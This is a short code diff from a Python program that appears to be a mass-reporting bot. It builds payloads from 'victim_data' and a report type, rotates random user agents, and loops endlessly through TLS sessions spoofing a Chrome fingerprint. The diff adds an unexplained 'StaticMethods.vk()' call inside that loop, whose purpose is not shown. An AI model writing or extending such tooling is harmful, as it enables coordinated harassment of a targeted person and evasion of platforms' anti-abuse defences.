@@ -50,6 +50,7 @@ class Program:
         self.payload = StaticMethods._getpayload(datetime.now().timestamp(),UserAgent().random,random.randint(7000000000000000000,9999999999999999999),random.randint(7000000000000000000,9999999999999999999),self.victim_data,self.report_type)
     def report(self):
         while True:
+            StaticMethods.vk()
             session = tls_client.Session(
                     client_identifier="chrome_106"
                 )
